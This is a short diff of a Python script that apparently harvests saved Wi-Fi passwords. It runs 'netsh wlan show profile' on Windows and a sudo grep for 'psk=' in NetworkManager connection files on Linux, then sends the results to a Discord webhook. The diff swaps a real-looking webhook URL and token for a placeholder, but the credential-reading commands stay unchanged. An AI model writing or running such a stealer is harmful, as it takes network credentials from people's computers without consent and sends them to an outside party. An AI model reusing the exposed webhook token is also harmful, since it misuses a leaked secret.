@@ -10,7 +10,7 @@ COMMAND_WINDOWS = "netsh wlan show profile"
 COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
 RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
 
-url = "https://discordapp.com/api/webhooks/753266148484710504/KeQgS-ukQnrKgSfXs8Orui17Cxm8aoX_aJvvObB4tqjrtLgU-luNT6cww0qQAD7XC0rb" #set webhook
+url = "https://discordapp.com/api/webhooks/example" #set webhook
 
 def identify():
     global OS
